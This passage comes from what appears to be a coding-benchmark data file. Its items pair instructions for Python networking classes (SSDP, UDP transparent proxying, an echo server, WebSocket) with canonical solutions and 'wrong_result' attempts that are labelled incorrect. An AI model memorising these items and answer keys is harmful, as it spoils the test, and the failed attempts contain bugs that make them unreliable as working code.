'M-SEARCH' and cmd[1] == '*':\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        (host, port) = host_port\n        for i in self.known.values():\n            if i['ST'] == headers['st'] or headers['st'] == 'ssdp:all':\n                response = ['HTTP/1.1 200 OK']\n                usn = None\n                for k, v in i.items():\n                    if k == 'USN':\n                        usn = v\n                    response.append('%s: %s' % (k, v))\n\n                if usn:\n                    response.append('DATE: %s' % formatdate(timeval=None, localtime=False, usegmt=True))\n                    response.extend(('', ''))\n                    destination = (host, port)\n                    for ip, mask in self.ip_list:\n                        if self.get_subnet_ip(ip, mask) == self.get_subnet_ip(host, mask):\n                            self.sock.sendto('\\r\\n'.join(response).format(ip).encode(), destination)\n                            break\n\n    def get_subnet_ip(self, ip, mask):\n        a = [int(n) for n in mask.split('.')]\n        b = [int(n) for n in ip.split('.')]\n        return [a[i] & b[i] for i in range(4)]\n\n    def shutdown(self):\n        for st in self.known:\n            self.do_byebye(st)\n        usn = [st for st in self.known]\n        for st in usn:\n            self.unregister(st)\n\n    def register(self, usn, st, location, server=SERVER_ID, cache_control='max-age=1800'):\n        self.known[usn] = {\n            'USN': usn,\n            'LOCATION': location,\n            'ST': st,\n            'EXT': '',\n            'SERVER': server,\n            'CACHE-CONTROL': cache_control\n        }\n\n    def unregister(self, usn):\n        del self.known[usn]\n\n    def do_byebye(self, usn):\n        if not self.sending_byebye:\n            return\n\n        resp = [\n            'NOTIFY * HTTP/1.1',\n            'HOST: %s:%d' % (SSDP_ADDR, SSDP_PORT),\n            'NTS: ssdp:byebye',\n        ]\n        try:\n            stcpy = dict(self.known[usn].items())\n            stcpy['NT'] = stcpy['ST']\n            del stcpy['ST']\n            resp.extend(map(lambda x: ': '.join(x), stcpy.items()))\n            resp.extend(('', ''))\n            if self.sock:\n                try:\n                    self.send_it('\\r\\n'.join(resp), (SSDP_ADDR, SSDP_PORT))\n                except (AttributeError, socket.error):\n                    pass\n        except KeyError:\n            pass\n\n    def send_it(self, response, destination):\n        for sock in self.sock_list:\n            sock.send_it(response, destination)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport threading\nimport struct\nimport time\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind(('', 1900))\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = False\n        self.known = {}\n\n    def start(self):\n        self.running = True\n        self.ssdp_thread = threading.Thread(target=self.run)\n        self.ssdp_thread.start()\n\n    def stop(self, byebye=False):\n        self.running = False\n        self.sending_byebye = byebye\n        if self.ssdp_thread:\n            self.ssdp_thread.join()\n\n    def run(self):\n        while self.running:\n            data, host_port = self.sock.recvfrom(1024)\n            self.datagram_received(data, host_port)\n\n    def datagram_received(self, data, host_port):\n        request = data.decode('utf-8')\n        lines = request.split('\\r\\n')\n        headers = {}\n        for line in lines:\n            if ':' in line:\n                key, value = line.split(':', 1)\n                headers[key.strip()] = value.strip()\n        if 'M-SEARCH' in request:\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        if 'ST' in headers and headers['ST'] in self.known:\n            for usn, info in self.known.items():\n                response = f\"HTTP/1.1 200 OK\\r\\n\"\n                response += f\"HOST: {headers['HOST']}\\r\\n\"\n                response += f\"LOCATION: {info['location']}\\r\\n\"\n                response += f\"USN: {usn}\\r\\n\"\n                response += f\"ST: {headers['ST']}\\r\\n\"\n                response += f\"SERVER: {info['server']}\\r\\n\"\n                response += f\"CACHE-CONTROL: {info['cache_control']}\\r\\n\"\n                response += \"\\r\\n\"\n                self.send_it(response, host_port)\n\n    def get_subnet_ip(self, ip, mask):\n        ip_parts = list(map(int, ip.split('.')))\n        mask_parts = list(map(int, mask.split('.')))\n        subnet_parts = [str(ip & mask) for ip, mask in zip(ip_parts, mask_parts)]\n        return '.'.join(subnet_parts)\n\n    def shutdown(self):\n        for usn in list(self.known.keys()):\n            self.do_byebye(usn)\n        self.stop()\n\n    def register(self, usn, st, location, server, cache_control):\n        self.known[usn] = {\n            'st': st,\n            'location': location,\n            'server': server,\n            'cache_control': cache_control\n        }\n\n    def unregister(self, usn):\n        if usn in self.known:\n            del self.known[usn]\n\n    def do_byebye(self, usn):\n        if usn in self.known:\n            info = self.known[usn]\n            response = f\"NOTIFY * HTTP/1.1\\r\\n\"\n            response += f\"HOST: 239.255.255.250:1900\\r\\n\"\n            response += f\"NTS: ssdp:byebye\\r\\n\"\n            response += f\"USN: {usn}\\r\\n\"\n            response += f\"ST: {info['st']}\\r\\n\"\n            response += \"\\r\\n\"\n            self.send_it(response, ('239.255.255.250', 1900))\n\n    def send_it(self, response, destination):\n        self.sock.sendto(response.encode('utf-8'), destination)\n```"
  },
  {
    "Task_id": 429,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with support for IP transparent proxying and original destination address retrieval.\n\nClass Description: The UDPSocketHandler class provides methods for receiving and sending UDP packets while maintaining information about both source and destination addresses. It supports both IPv4 and IPv6 protocols and includes special handling for transparent proxying scenarios.\n\nAttributes:\n[No explicit attributes are defined in the class, as it primarily operates through its methods]\n\nMethods:\n\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP packets and extracts both source and destination address information. Uses recvmsg() to get ancillary data containing the original destination address.\n  Input:\n    - listener: A bound UDP socket object\n    - bufsize: Maximum buffer size for received data\n  Output:\n    - tuple: (srcip: tuple, dstip: tuple, data: bytes) containing source address, destination address, and received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP packets while maintaining source address information through IP transparent option.\n  Input:\n    - sock: The socket to use for sending\n    - srcip: Source address tuple (IP, port)\n    - dstip: Destination address tuple (IP, port)\n    - data: The data to send\n  Output: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures UDP listener sockets for transparent proxying and original destination address retrieval.\n  Input:\n    - udp_listener: An object containing v4 and v6 socket instances\n  Output: None\n\nMethod4: setsockopt_error(e: Exception) -> None - Handles permission errors related to socket options and raises a fatal error.\n  Input:\n    - e: The caught PermissionError exception\n  Output: None (raises Fatal exception)",
    "Canonical_solution": "import socket\nimport os\nimport struct\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(\n            4096, socket.CMSG_SPACE(24))\n        dstip = None\n        family = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n                \"-- ignored UDP to %r: \"\n                \"couldn't determine source IP address\\n\" % (dstip,))\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        try:\n            sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        try:\n            udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(\n                socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)\n\n    def setsockopt_error(self, e):\n        raise Fatal(\"Insufficient permissions for tproxy method.\\n\"\n                   \"Your effective UID is %d, not 0. Try rerunning as root.\\n\"\n                   % os.geteuid())",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport struct\nfrom typing import Tuple, Any, Optional\n\nclass UDPSocketHandler:\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Tuple[str, int], Tuple[str, int], bytes]:\n        data, ancdata, _, srcip = listener.recvmsg(bufsize, socket.CMSG_SPACE(struct.calcsize('i4')) + socket.CMSG_SPACE(struct.calcsize('i4')))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if (cmsg_level == socket.SOL_IP and cmsg_type == socket.IP_ORIGDSTADDR) or \\\n               (cmsg_level == socket.SOL_IPV6 and cmsg_type == socket.IPV6_ORIGDSTADDR):\n                dstip = socket.inet_ntop(cmsg_level == socket.SOL_IPV6, cmsg_data[:])\n                break\n        return srcip, (dstip, srcip[1]), data\n\n    def send_udp(self, sock: socket.socket, srcip: Tuple[str, int], dstip: Tuple[str, int], data: bytes) -> None:\n        sock.bind(srcip)\n        sock.sendto(data, dstip)\n\n    def setup_udp_listener(self, udp_listener: Any) -> None:\n        try:\n            for sock in [udp_listener.v4, udp_listener.v6]:\n                if sock.family == socket.AF_INET:\n                    sock.setsockopt(socket.SOL_IP, socket.IP_TRANSPARENT, 1)\n                elif sock.family == socket.AF_INET6:\n                    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n\n    def setsockopt_error(self, e: Exception) -> None:\n        raise Fatal(\"Permission denied: Unable to set socket options. Please run as root or adjust your system settings.\") from e\n\nclass Fatal(Exception):\n    pass\n```"
  },
  {
    "Task_id": 430,
    "Instruction": "Task Description: Implement a UDP echo server that receives data from clients and sends the same data back to the client.\n\nFunction Description: The function `udp_echo_server` creates a UDP socket, binds it to a specified host and port, and continuously listens for incoming data. When data is received, it echoes the same data back to the sender. The function runs indefinitely until manually stopped.\n\nInput:  \n- `host` (str, optional): The local IP address to bind the socket to. Defaults to 'localhost'.  \n- `port` (int, optional): The port number to bind the socket to. Defaults to 6789.  \n\nOutput: None (The function runs indefinitely and does not return any value.)",
    "Canonical_solution": "from socket import *\n\ndef udp_echo_server(host='localhost', port=6789):\n    server = socket(AF_INET, SOCK_DGRAM)\n    server.bind((host, port))\n    while True:\n        data, addr = server.recvfrom(1024)\n        server.sendto(data, addr)\n    server.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\n\ndef udp_echo_server(host='localhost', port=6789):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((host, port))\n    print(f\"UDP Echo Server started on {host}:{port}\")\n    \n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f\"Received message: {data.decode()} from {addr}\")\n        sock.sendto(data, addr)\n\nif __name__ == \"__main__\":\n    udp_echo_server()\n```"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a class for discovering devices on a network using SSDP (Simple Service Discovery Protocol) over UDP multicast. The class should be able to send discovery requests and handle responses from devices.\n\nClass Description: The SSDPDiscover class is responsible for discovering UPnP/DLNA devices on a local network using SSDP. It sends M-SEARCH requests to a multicast address and listens for responses. The class supports both single-socket and multi-socket modes for sending discovery requests.\n\nAttributes:\n- SSDP_ADDRESS: [str] - The multicast address for SSDP (239.255.255.250)\n- SSDP_PORT: [int] - The port number for SSDP (1900)\n- SSDP_MX: [int] - The maximum wait time for responses (in seconds)\n- SSDP_TTL: [int] - The time-to-live for multicast packets\n- SSDP_AMOUNT: [int] - The number of discovery requests to send\n- MSEARCH_PORT: [int] - The local port to bind to for sending discovery requests (0 for random)\n- MSEARCH_MSG: [str] - The M-SEARCH request message template\n- BUFFER_SIZE: [int] - The size of the buffer for receiving responses\n- USE_SINGLE_SOCKET: [bool] - Whether to use a single socket for all requests or one per interface\n- cb_on_device_response: [callable] - Callback function to handle device responses\n- host: [str] - The host address to bind to (None for all interfaces)\n- addresses: [list] - List of local IPv4 addresses\n\nMethods:\n- __init__(cb_on_device_response, host=None) -> [None] - Initializes the SSDPDiscover instance with a callback for device responses and an optional host address.\n- refresh_addresses() -> [None] - Refreshes the list of local IPv4 addresses.\n- search(ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None) -> [None] - Initiates the device discovery process with optional parameters for TTL, MX, and request amount.\n- _search(host, ssdp_ttl, ssdp_mx, ssdp_amount) -> [None] - Internal method to perform the discovery process for a specific host.\n- _send_discover(sock, ssdp_mx) -> [None] - Internal method to send an M-SEARCH request using the provided socket.",
    "Canonical_solution": "import socket\nimport threading\nimport logging\nimport chardet\nimport traceback\nimport pulseaudio_dlna.utils.network\nimport pulseaudio_dlna.plugins.dlna.ssdp\n\nlogger = logging.getLogger('pulseaudio_dlna.discover')\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = '239.255.255.250'\n    SSDP_PORT = 1900\n    SSDP_MX = 3\n    SSDP_TTL = 10\n    SSDP_AMOUNT = 5\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = '\\r\\n'.join([\n        'M-SEARCH * HTTP/1.1',\n        'HOST: {host}:{port}',\n        'MAN: \"ssdp:discover\"',\n        'MX: {mx}',\n        'ST: ssdp:all',\n    ]) + '\\r\\n' * 2\n    BUFFER_SIZE = 1024\n    USE_SINGLE_SOCKET = True\n\n    def __init__(self, cb_on_device_response, host=None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = []\n        self.refresh_addresses()\n\n    def refresh_addresses(self):\n        self.addresses = pulseaudio_dlna.utils.network.ipv4_addresses()\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        ssdp_mx = ssdp_mx or self.SSDP_MX\n        ssdp_ttl = ssdp_ttl or self.SSDP_TTL\n        ssdp_amount = ssdp_amount or self.SSDP_AMOUNT\n\n        if self.USE_SINGLE_SOCKET:\n            self._search(self.host or '', ssdp_ttl, ssdp_mx, ssdp_amount)\n        else:\n            if self.host:\n                self._search(self.host, ssdp_ttl, ssdp_mx, ssdp_amount)\n            else:\n                threads = []\n                for addr in self.addresses:\n                    thread = threading.Thread(\n                        target=self._search,\n                        args=[addr, ssdp_ttl, ssdp_mx, ssdp_amount])\n                    threads.append(thread)\n                try:\n                    for thread in threads:\n                        thread.start()\n                    for thread in threads:\n                        thread.join()\n                except:\n                    traceback.print_exc()\n\n    def _search(self, host, ssdp_ttl, ssdp_mx, ssdp_amount):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        sock.settimeout(ssdp_mx)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ssdp_ttl)\n        sock.bind((host, self.MSEARCH_PORT))\n\n        for i in range(1, ssdp_amount + 1):\n            t = threading.Timer(\n                float(i) / 2, self._send_discover, args=[sock, ssdp_mx])\n            t.start()\n\n        while True:\n            try:\n                header, address = sock.recvfrom(self.BUFFER_SIZE)\n                if self.cb_on_device_response:\n                    guess = chardet.detect(header)\n                    header = header.decode(guess['encoding'])\n                    header = pulseaudio_dlna.plugins.dlna.ssdp._get_header_map(header)\n                    self.cb_on_device_response(header, address)\n            except socket.timeout:\n                break\n        sock.close()\n\n    def _send_discover(self, sock, ssdp_mx):\n        msg = self.MSEARCH_MSG.format(\n            host=self.SSDP_ADDRESS, port=self.SSDP_PORT, mx=ssdp_mx)\n        if self.USE_SINGLE_SOCKET:\n            for addr in self.addresses:\n                sock.setsockopt(\n                    socket.SOL_IP, socket.IP_MULTICAST_IF,\n                    socket.inet_aton(addr))\n                sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))\n        else:\n            sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport struct\nimport threading\nimport time\nfrom ipaddress import ip_address\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = \"239.255.255.250\"\n    SSDP_PORT = 1900\n    SSDP_MX = 3\n    SSDP_TTL = 2\n    SSDP_AMOUNT = 1\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = (\n        \"M-SEARCH * HTTP/1.1\\r\\n\"\n        \"HOST: {SSDP_ADDRESS}:{SSDP_PORT}\\r\\n\"\n        \"MAN: \\\"ssdp:discover\\\"\\r\\n\"\n        \"MX: {SSDP_MX}\\r\\n\"\n        \"ST: ssdp:all\\r\\n\\r\\n\"\n    )\n    BUFFER_SIZE = 1024\n    USE_SINGLE_SOCKET = False\n\n    def __init__(self, cb_on_device_response, host=None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = []\n        self.refresh_addresses()\n\n    def refresh_addresses(self):\n        self.addresses = [\n            str(addr)\n            for addr in socket.gethostbyname_ex(socket.gethostname())[2]\n            if ip_address(addr).is_private\n        ]\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        ssdp_ttl = ssdp_ttl or self.SSDP_TTL\n        ssdp_mx = ssdp_mx or self.SSDP_MX\n        ssdp_amount = ssdp_amount or self.SSDP_AMOUNT\n\n        if self.USE_SINGLE_SOCKET:\n            sock = self._create_socket()\n            try:\n                for _ in range(ssdp_amount):\n                    self._send_discover(sock, ssdp_mx)\n                    time.sleep(1)\n            finally:\n                sock.close()\n        else:\n            threads = []\n            for addr in self.addresses:\n                thread = threading.Thread(\n                    target=self._search, args=(addr, ssdp_ttl, ssdp_mx, ssdp_amount)\n                )\n                thread.start()\n                threads.append(thread)\n\n            for thread in threads:\n                thread.join()\n\n    def _search(self, host, ssdp_ttl, ssdp_mx, ssdp_amount):\n        sock = self._create_socket()\n        try:\n            for _ in range(ssdp_amount):\n                self._send_discover(sock, ssdp_mx)\n                time.sleep(1)\n        finally:\n            sock.close()\n\n    def _send_discover(self, sock, ssdp_mx):\n        msg = self.MSEARCH_MSG.format(\n            SSDP_ADDRESS=self.SSDP_ADDRESS,\n            SSDP_PORT=self.SSDP_PORT,\n            SSDP_MX=ssdp_mx,\n        )\n        sock.sendto(msg.encode(), (self.SSDP_ADDRESS, self.SSDP_PORT))\n\n    def _create_socket(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.SSDP_TTL)\n        if self.host:\n            sock.bind((self.host, self.MSEARCH_PORT))\n        else:\n            sock.bind((\"\", self.MSEARCH_PORT))\n        return sock\n```"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Implement a UDP socket handler class that provides advanced UDP communication capabilities, including receiving original destination addresses and supporting both IPv4 and IPv6 transparent proxying.\n\nClass Description: UDPSocketHandler is a utility class designed to handle UDP socket operations with special features like retrieving original destination addresses and supporting transparent proxying. It provides methods for receiving UDP packets with ancillary data, sending UDP packets with specific source addresses, and setting up UDP listeners with appropriate socket options.\n\nAttributes:\n- recvmsg: Optional[str] - Stores the detected implementation method for recvmsg ('python', 'socket_ext', or None)\n\nMethods:\n- _detect_recvmsg_implementation() -> Optional[str] - Detects available recvmsg implementation methods\n- recv_udp(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Receives UDP data with source and destination address information\n- _recv_udp_python(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Python native implementation of recv_udp\n- _recv_udp_socket_ext(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - socket_ext implementation of recv_udp\n- _recv_udp_fallback(listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes] - Fallback implementation without ancillary data support\n- send_udp(sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None - Sends UDP data with specified source address\n- setup_udp_listener(udp_listener: socket.socket) -> None - Configures UDP listener socket with transparent proxying options",
    "Canonical_solution": "import struct\nimport socket\nfrom typing import Optional, Tuple, Any\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = self._detect_recvmsg_implementation()\n        \n    def _detect_recvmsg_implementation(self) -> Optional[str]:\n        try:\n            import socket as pythonsocket\n            getattr(pythonsocket.socket, \"recvmsg\")\n            return \"python\"\n        except AttributeError:\n            try:\n                import socket_ext\n                getattr(socket_ext.socket, \"recvmsg\")\n                return \"socket_ext\"\n            except ImportError:\n                return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg == \"python\":\n            return self._recv_udp_python(listener, bufsize)\n        elif self.recvmsg == \"socket_ext\":\n            return self._recv_udp_socket_ext(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, ancdata, msg_flags, srcip = listener.recvmsg(4096, socket.CMSG_SPACE(24))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data)\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        srcip, data, adata, flags = listener.recvmsg((bufsize,), socket.CMSG_SPACE(24))\n        dstip = None\n        for a in adata:\n            if a.cmsg_level == socket.SOL_IP and a.cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif a.cmsg_level == SOL_IPV6 and a.cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data[0])\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        data, srcip = listener.recvfrom(bufsize)\n        return (srcip, None, data)\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        if not srcip:\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        if hasattr(udp_listener, 'v4') and udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if hasattr(udp_listener, 'v6') and udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport sys\nfrom typing import Any, Optional, Tuple\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = self._detect_recvmsg_implementation()\n\n    def _detect_recvmsg_implementation(self) -> Optional[str]:\n        try:\n            import socket_ext\n            socket_ext.socket.recvmsg\n            return 'socket_ext'\n        except ImportError:\n            pass\n        if hasattr(socket, 'CMSG_SPACE'):\n            return 'python'\n        return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg == 'python':\n            return self._recv_udp_python(listener, bufsize)\n        elif self.recvmsg == 'socket_ext':\n            return self._recv_udp_socket_ext(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        cmsg_len = socket.CMSG_SPACE(struct.calcsize('i')) + socket.CMSG_SPACE(struct.calcsize('II'))\n        data, ancdata, flags, addr = listener.recvmsg(bufsize, cmsg_len)\n        dst_addr = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == socket.IP_ORIGDSTADDR:\n                dst_addr = socket.inet_ntop(socket.AF_INET, cmsg_data[:4]), struct.unpack('!H', cmsg_data[4:])[0]\n            elif cmsg_level == socket.SOL_IPV6 and cmsg_type == socket.IPV6_ORIGDSTADDR:\n                dst_addr = socket.inet_ntop(socket.AF_INET6, cmsg_data), struct.unpack('!H', cmsg_data[16:])[0]\n        return addr, dst_addr, data\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, ancdata, flags, addr = socket_ext.socket.recvmsg(listener, bufsize)\n        dst_addr = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == socket.IP_ORIGDSTADDR:\n                dst_addr = socket.inet_ntop(socket.AF_INET, cmsg_data[:4]), struct.unpack('!H', cmsg_data[4:])[0]\n            elif cmsg_level == socket.SOL_IPV6 and cmsg_type == socket.IPV6_ORIGDSTADDR:\n                dst_addr = socket.inet_ntop(socket.AF_INET6, cmsg_data), struct.unpack('!H', cmsg_data[16:])[0]\n        return addr, dst_addr, data\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        data, addr = listener.recvfrom(bufsize)\n        return addr, None, data\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        if srcip:\n            sock.bind(srcip)\n        sock.sendto(data, dstip)\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        if sys.platform.startswith('linux'):\n            udp_listener.setsockopt(socket.SOL_IP, socket.IP_TRANSPARENT, 1)\n            udp_listener.setsockopt(socket.SOL_IPV6, socket.IPV6_TRANSPARENT, 1)\n```"
  },
  {
    "Task_id": 434,
    "Instruction": "Task Description: Implement a WebSocket client connection using Tornado in Python, which handles WebSocket protocol communication including connection establishment, message exchange, and connection closure.\n\nClass Description: WebSocketClientConnection is a Tornado-based WebSocket client implementation that manages the lifecycle of a WebSocket connection, including handling messages, pings, and connection events.\n\nAttributes:\n- connect_future: Future - A future representing the connection attempt\n- read_queue: Queue - A queue for incoming messages\n- key: bytes - The WebSocket handshake key\n- _on_message_callback: Optional[Callable] - Callback for received messages\n- close_code: Optional[int] - WebSocket close code\n- close_reason: Optional[str] - WebSocket close reason\n- params: _WebSocketParams - WebSocket connection parameters\n- tcp_client: TCPClient - Underlying TCP client\n- protocol: Optional[WebSocketProtocol] - WebSocket protocol handler\n\nMethods:\n- __init__(request: HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[Resolver]) -> None - Initializes the WebSocket client connection\n- close(code: Optional[int], reason: Optional[str]) -> None - Closes the WebSocket connection\n- on_connection_close() -> None - Handles connection closure\n- on_ws_connection_close(close_code: Optional[int], close_reason: Optional[str]) -> None - Handles WebSocket-specific connection closure\n- _on_http_response(response: HTTPResponse) -> None - Handles HTTP response during connection\n- 